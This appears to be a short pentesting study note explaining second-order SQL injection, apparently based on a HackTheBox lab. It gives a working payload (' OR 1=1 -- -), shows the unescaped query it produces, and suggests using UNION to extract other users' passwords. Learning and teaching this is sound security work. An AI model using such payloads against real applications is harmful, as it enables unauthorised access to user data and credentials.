




# SQL Injections



## Second Order SQL Injections

* username = ' OR 1=1 -- -

|   username     |          email        |     password     |    notes    |
| ' OR 1=1 -- -  |     test@test.com     |     testpass     | asdfasdf    |
|    tyler       |  tyler@secnotes.htb   |     otherpass    | asdfasdf    |

 ---------------------------------------------------------------------
Username is escaped correctly when being put into the database:
* username = \'\ OR\ 1\=1 \-\-\ \-
```sql
INSERT INTO users VALUES \'\ OR\ 1\=1 \-\-\ \-
```
When the site is loaded, however, the SQL query would NOT escape the characters,
because the developers implicitly trust it because the application is executing 
the query, with no user input.

```sql
SELECT notes FROM users WHERE username='' OR 1=1 -- -'
```
Select `notes` from `users` where `username` is equal to `''` (an empty string) **OR** `1=1` (true)  
This is essentially simplified as:
```sql
SELECT notes FROM users WHERE username=TRUE
```


You could very well even extend the query to use some UNION clause in order to extract the other users´ passwords.
Although probing for table names, etc. would be rather cumbersome with that second order injection I suppose





## Important Tools for Pentesting
responder
esc1




